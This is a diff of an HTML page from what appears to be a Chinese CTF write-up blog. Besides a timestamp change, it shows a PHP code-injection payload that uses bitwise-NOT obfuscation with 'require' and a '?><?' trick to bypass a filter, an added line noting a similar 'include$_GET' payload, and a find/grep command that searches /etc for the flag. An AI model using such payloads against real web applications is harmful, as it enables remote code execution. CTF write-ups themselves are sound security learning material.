@@ -44,7 +44,7 @@
 <meta property="og:image" content="https://i.loli.net/2020/05/01/dSajYXqtHAVkEyG.png">
 <meta property="og:image" content="https://i.loli.net/2020/05/01/rlOAe5j6RE1SDiW.png">
 <meta property="article:published_time" content="2020-05-01T02:49:49.000Z">
-<meta property="article:modified_time" content="2020-05-06T06:52:22.524Z">
+<meta property="article:modified_time" content="2020-05-06T13:21:12.624Z">
 <meta property="article:author" content="glotozz">
 <meta property="article:tag" content="wp">
 <meta name="twitter:card" content="summary">
@@ -195,6 +195,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;]&#x3D;1?&gt;&lt;?&#x3D;require~%d0%99%93%9e%98%d1%8b%87%8b?&gt;</span><br></pre></td></tr></table></figure>
 
 <p>核心是：PHP黑魔法 <code>require</code>和取反运算符之间不需要空格照样执行，以及<code>?&gt;&lt;?</code>绕过分号</p>
+<p>类似的还有<code>&lt;?=include$_GET[1];?&gt;</code>当然这里被过滤了</p>
 <p>搜索flag </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F;etc -name &quot;*&quot; | xargs grep &quot;flag&#123;&quot;</span><br></pre></td></tr></table></figure>
 
